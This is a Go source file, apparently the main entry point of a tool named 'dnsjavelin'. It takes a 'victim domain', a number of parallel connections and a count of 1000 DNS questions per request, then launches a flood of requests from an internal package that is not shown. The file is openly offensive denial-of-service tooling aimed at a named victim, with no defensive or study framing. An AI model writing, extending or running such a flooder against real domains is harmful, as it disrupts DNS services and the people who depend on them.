package main

import (
	"flag"
	"log"
	"runtime"
	"time"

	"github.com/sheophe/dnsjavelin/internal"
)

func main() {
	victimDomain := flag.String("d", "", "victim domain name")
	nRoutines := flag.Int("c", 2*runtime.NumCPU(), "number of parallel connections")
	nQuestions := flag.Int("n", 1000, "number of DNS qeustion in one request")
	sleep := flag.Duration("s", time.Millisecond, "sleep between requests")
	flag.Parse()
	if *victimDomain == "" {
		log.Fatalf("victim domain must be specified")
	}
	launcher := internal.NewLauncher(*nRoutines, *nQuestions, *victimDomain, sleep)
	launcher.Initialize()
	launcher.Start()
	launcher.AwaitShutdown()
	launcher.Stop()
}
